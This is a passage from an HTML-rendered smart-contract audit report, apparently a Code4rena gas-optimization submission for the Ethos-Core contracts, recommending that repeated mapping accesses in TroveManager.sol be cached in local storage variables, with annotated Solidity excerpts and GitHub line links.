class=\"mtk11\">_computeNewStake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_coll</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1321</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_addTroveOwnerToArray</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint128</span><span class=\"mtk1\"> </span><span class=\"mtk12\">index</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1538</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireMoreThanOneTroveInSystem</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TroveOwnersArrayLength</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L320\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/ActivePool.sol#L320</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"122\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ActivePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">320</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireCallerIsBorrowerOperationsOrDefaultPool</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<h2 id=\"multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" style=\"position:relative;\"><a href=\"#multiple-accesses-of-a-mappingarray-should-use-a-local-variable-cache\" aria-label=\"multiple accesses of a mappingarray should use a local variable cache permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Multiple accesses of a mapping/array should use a local variable cache</h2>\n<p>Caching a mapping’s value in a local storage or calldata variable when the value is accessed multiple times saves ~42 gas per access due to not having to perform the same offset calculation every time.</p>\n<p><strong>Help the Optimizer by saving a storage variable’s reference instead of repeatedly fetching it</strong></p>\n<p>To help the optimizer,declare a storage type variable and use it instead of repeatedly fetching the reference in a map or an array. </p>\n<p>As an example, instead of repeatedly calling <code>someMap[someIndex]</code>, save its reference like this: <code>SomeStruct storage someStruct = someMap[someIndex]</code> and use it.</p>\n<h3 id=\"trovemanagersolupdatedebtandcollandstakespostredemption-troves_borrower_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#trovemanagersolupdatedebtandcollandstakespostredemption-troves_borrower_collateral-should-be-cached-in-local-storage\" aria-label=\"trovemanagersolupdatedebtandcollandstakespostredemption troves_borrower_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol.updateDebtAndCollAndStakesPostRedemption(): Troves[_borrower][_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L962-L980\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L962-L980</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"123\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">962</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateDebtAndCollAndStakesPostRedemption</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">967:    ) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">968</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_requireCallerIsRedemptionHelper</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">969</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newDebt</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit: Initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">970</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">coll</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newColl</span><span class=\"mtk1\">;</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">971</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">_updateStakeAndTotalStakes</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">973</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TroveUpdated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">977</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">,</span><span class=\"mtk3\">//@audit: 3rd access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">978</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">TroveManagerOperation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">redeemCollateral</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">979</span><span class=\"mtk1\">:        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">980</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"trovemanagersol_getcurrenttroveamounts-troves_borrower_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#trovemanagersol_getcurrenttroveamounts-troves_borrower_collateral-should-be-cached-in-local-storage\" aria-label=\"trovemanagersol_getcurrenttroveamounts troves_borrower_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol._getCurrentTroveAmounts(): Troves[_borrower][_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1066-L1074\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1066-L1074</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"124\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1066</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getCurrentTroveAmounts</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1070</span><span class=\"mtk1\">:\t </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentCollateral</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">coll</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pendingCollateralReward</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: Initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1071</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">currentLUSDDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pendingLUSDDebtReward</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span></code></pre>\n<h3 id=\"trovemanagersol_applypendingrewards-troves_borrower_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#trovemanagersol_applypendingrewards-troves_borrower_collateral-should-be-cached-in-local-storage\" aria-label=\"trovemanagersol_applypendingrewards troves_borrower_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol._applyPendingRewards(): Troves[_borrower][_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1082-L1108\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1082-L1108</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"125\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1082</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_applyPendingRewards</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IActivePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_activePool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">IDefaultPool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_defaultPool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1091</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">coll</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">coll</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pendingCollateralReward</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: Initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1092</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">.</span><span class=\"mtk11\">add</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pendingLUSDDebtReward</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1099</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TroveUpdated</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1100</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1101</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1102</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">debt</span><span class=\"mtk1\">,</span><span class=\"mtk3\">//@audit: 3rd access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1103</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">coll</span><span class=\"mtk1\">,</span><span class=\"mtk3\">//@audit: 4th access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1104</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">Troves</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">stake</span><span class=\"mtk1\">,</span><span class=\"mtk3\">//@audit: 5th access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1105</span><span class=\"mtk1\">:                </span><span class=\"mtk12\">TroveManagerOperation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">applyPendingRewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1106</span><span class=\"mtk1\">:            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1107</span><span class=\"mtk1\">:        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1108</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"trovemanagersol_updatetroverewardsnapshots-rewardsnapshots_borrower_collateral-lcollateralcollateral-and-llusddebtcollateral-should-be-cached\" style=\"position:relative;\"><a href=\"#trovemanagersol_updatetroverewardsnapshots-rewardsnapshots_borrower_collateral-lcollateralcollateral-and-llusddebtcollateral-should-be-cached\" aria-label=\"trovemanagersol_updatetroverewardsnapshots rewardsnapshots_borrower_collateral lcollateralcollateral and llusddebtcollateral should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol._updateTroveRewardSnapshots(): rewardSnapshots[_borrower][_collateral], L<em>Collateral[\\</em>collateral] and L<em>LUSDDebt[\\</em>collateral] should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1116-L1120\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1116-L1120</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"126\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1116</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateTroveRewardSnapshots</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1117</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">rewardSnapshots</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">L_Collateral</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">];</span><span class=\"mtk3\">//@audit: Initial access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1118</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">rewardSnapshots</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">][</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">].</span><span class=\"mtk12\">LUSDDebt</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">L_LUSDDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">];</span><span class=\"mtk3\">//@audit: 2nd access</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1119</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TroveSnapshotsUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">, </span><span class=\"mtk12\">L_Collateral</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">], </span><span class=\"mtk12\">L_LUSDDebt</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1120</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"trovemanagersolgetpendingcollateralreward-troves_borrower_collateral-should-be-cached-in-local-storage\" style=\"position:relative;\"><a href=\"#trovemanagersolgetpendingcollateralreward-troves_borrower_collateral-should-be-cached-in-local-storage\" aria-label=\"trovemanagersolgetpendingcollateralreward troves_borrower_collateral should be cached in local storage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>TroveManager.sol.getPendingCollateralReward(): Troves[_borrower][_collateral] should be cached in local storage</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1123-L1135\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L1123-L1135</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"127\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">1123</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPendingCollateralReward</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span 